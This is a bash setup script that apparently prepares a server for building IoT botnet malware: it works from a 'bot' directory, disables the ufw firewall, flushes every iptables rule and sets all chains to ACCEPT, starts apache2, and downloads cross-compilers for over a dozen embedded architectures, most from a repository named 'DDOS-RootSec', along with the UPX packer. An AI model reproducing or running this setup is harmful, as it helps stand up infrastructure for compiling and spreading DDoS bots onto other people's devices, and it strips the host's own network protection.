#!/bin/bash

ufw disable
cd bot

sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -P FORWARD ACCEPT

service apache2 start

rm -rf *.deb
mkdir -p /etc/xcompile
cd /etc/xcompile

# download compilers (replaced ubuntu's legacy ones with these i found)
wget https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/download/arc-2017.09-release/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-powerpc.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-sh4.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-mips.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-mipsel.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-x86_64.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-m68k.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-sparc.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-i486.tar.gz
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv4l.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv5l.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv6l.tar.bz2
wget https://github.com/rawbypa/armv7l/raw/main/cross-compiler-armv7l.tar.bz2 -O cross-compiler-armv7l.tar.bz2
wget https://toolchains.bootlin.com/downloads/releases/toolchains/aarch64/tarballs/aarch64--uclibc--stable-2024.05-1.tar.xz -O aarch64-toolchain.tar.xz --waitretry=0 --tries=0 --timeout=3
wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-amd64_linux.tar.xz
tar -xf upx-3.94-amd64_linux.tar.xz
mv upx-3.94-amd64_linux/upx /usr/local/bin/
rm -rf upx-3.94-amd64_linux upx-3.94-amd64_linux.tar.xz
# extract compilers
# ARC
if [ -f arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz ]; then
  mkdir -p arc && cd arc
  tar -xf ../arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
  mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install/* . 2>/dev/null || true
  rmdir arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install 2>/dev/null || true
  cd ..
fi
# POWERPC
if [ -f cross-compiler-powerpc.tar.bz2 ]; then
  mkdir -p powerpc && cd powerpc
  tar -xjf ../cross-compiler-powerpc.tar.bz2
  mv cross-compiler-powerpc/* . 2>/dev/null || true
  rmdir cross-compiler-powerpc 2>/dev/null || true
  cd ..
fi
# SH4
if [ -f cross-compiler-sh4.tar.bz2 ]; then
  mkdir -p sh4 && cd sh4
  tar -xjf ../cross-compiler-sh4.tar.bz2
  mv cross-compiler-sh4/* . 2>/dev/null || true
  rmdir cross-compiler-sh4 2>/dev/null || true
  cd ..
fi
# MIPS
if [ -f cross-compiler-mips.tar.bz2 ]; then
  mkdir -p mips && cd mips
  tar -xjf ../cross-compiler-mips.tar.bz2
  mv cross-compiler-mips/* . 2>/dev/null || true
  rmdir cross-compiler-mips 2>/dev/null || true
  cd ..
fi
# MIPSEL
if [ -f cross-compiler-mipsel.tar.bz2 ]; then
  mkdir -p mipsel && cd mipsel
  tar -xjf ../cross-compiler-mipsel.tar.bz2
  mv cross-compiler-mipsel/* . 2>/dev/null || true
  rmdir cross-compiler-mipsel 2>/dev/null || true
  cd ..
fi
# X86_64
if [ -f cross-compiler-x86_64.tar.bz2 ]; then
  mkdir -p x86_64 && cd x86_64
  tar -xjf ../cross-compiler-x86_64.tar.bz2
  mv cross-compiler-x86_64/* . 2>/dev/null || true
  rmdir cross-compiler-x86_64 2>/dev/null || true
  cd ..
fi
# M68K
if [ -f cross-compiler-m68k.tar.bz2 ]; then
  mkdir -p m68k && cd m68k
  tar -xjf ../cross-compiler-m68k.tar.bz2
  mv cross-compiler-m68k/* . 2>/dev/null || true
  rmdir cross-compiler-m68k 2>/dev/null || true
  cd ..
fi
# SPARC
if [ -f cross-compiler-sparc.tar.bz2 ]; then
  mkdir -p sparc && cd sparc
  tar -xjf ../cross-compiler-sparc.tar.bz2
  mv cross-compiler-sparc/* . 2>/dev/null || true
  rmdir cross-compiler-sparc 2>/dev/null || true
  cd ..
fi
# I486
if [ -f cross-compiler-i486.tar.gz ]; then
  mkdir -p i486 && cd i486
  tar -xzf ../cross-compiler-i486.tar.gz
  mv cross-compiler-i486/* . 2>/dev/null || true
  rmdir cross-compiler-i486 2>/dev/null || true
  cd ..
fi
# AARCH64
if [ -f aarch64-toolchain.tar.xz ]; then
  xz -d aarch64-toolchain.tar.xz
fi
if [ -f aarch64-toolchain.tar ]; then
  mkdir -p aarch64 && cd aarch64
  tar -xf ../aarch64-toolchain.tar
  rm ../aarch64-toolchain.tar
  aarch64_dir=$(find . -maxdepth 1 -type d ! -name . | head -n 1)
  if [ -n "$aarch64_dir" ]; then
    mv "$aarch64_dir"/* . 2>/dev/null || true
    rmdir "$aarch64_dir" 2>/dev/null || true
  fi
  cd ..
fi
# ARMV4L
if [ -f cross-compiler-armv4l.tar.bz2 ]; then
  mkdir -p armv4l && cd armv4l
  tar -xjf ../cross-compiler-armv4l.tar.bz2
  mv cross-compiler-armv4l/* . 2>/dev/null || true
  rmdir cross-compiler-armv4l 2>/dev/null || true
  cd ..
fi
# ARMV5L
if [ -f cross-compiler-armv5l.tar.bz2 ]; then
  mkdir -p armv5l && cd armv5l
  tar -xjf ../cross-compiler-armv5l.tar.bz2
  mv cross-compiler-armv5l/* . 2>/dev/null || true
  rmdir cross-compiler-armv5l 2>/dev/null || true
  cd ..
fi
# ARMV6L
if [ -f cross-compiler-armv6l.tar.bz2 ]; then
  mkdir -p armv6l && cd armv6l
  tar -xjf ../cross-compiler-armv6l.tar.bz2
  mv cross-compiler-armv6l/* . 2>/dev/null || true
  rmdir cross-compiler-armv6l 2>/dev/null || true
  cd ..
fi
# ARMV7L
if [ -f cross-compiler-armv7l.tar.bz2 ]; then
  mkdir -p armv7l && cd armv7l
  tar -xjf ../cross-compiler-armv7l.tar.bz2
  if [ -d cross-compiler-armv7l ]; then
    mv cross-compiler-armv7l/* . 2>/dev/null || true
    rmdir cross-compiler-armv7l 2>/dev/null || true
  fi
  rm ../cross-compiler-armv7l.tar.bz2
  cd ..
fi

export PATH=/etc/xcompile/arc/bin:$PATH
export PATH=/etc/xcompile/powerpc/bin:$PATH
export PATH=/etc/xcompile/sh4/bin:$PATH
export PATH=/etc/xcompile/mips/bin:$PATH
export PATH=/etc/xcompile/mipsel/bin:$PATH
export PATH=/etc/xcompile/x86_64/bin:$PATH
export PATH=/etc/xcompile/m68k/bin:$PATH
export PATH=/etc/xcompile/sparc/bin:$PATH
export PATH=/etc/xcompile/i486/bin:$PATH
export PATH=/etc/xcompile/aarch64/bin:$PATH
export PATH=/etc/xcompile/armv4l/bin:$PATH
export PATH=/etc/xcompile/armv5l/bin:$PATH
export PATH=/etc/xcompile/armv6l/bin:$PATH
export PATH=/etc/xcompile/armv7l/bin:$PATH

for d in arc powerpc sh4 mips mipsel x86_64 m68k sparc i486 aarch64 armv4l armv5l armv6l armv7l; do
  echo "export PATH=/etc/xcompile/$d/bin:\$PATH" >> ~/.bashrc
  if [ -d "/etc/xcompile/$d/bin" ]; then
    for bin in /etc/xcompile/$d/bin/*; do
      [ -f "$bin" ] && sudo ln -sf "$bin" /usr/local/bin/$(basename "$bin")
    done
  fi
done

rm -rf *.tar.gz *.tar.xz *.bz2
if [ -n "$BASH_VERSION" ]; then
  source ~/.bashrc
else
  . ~/.bashrc
fi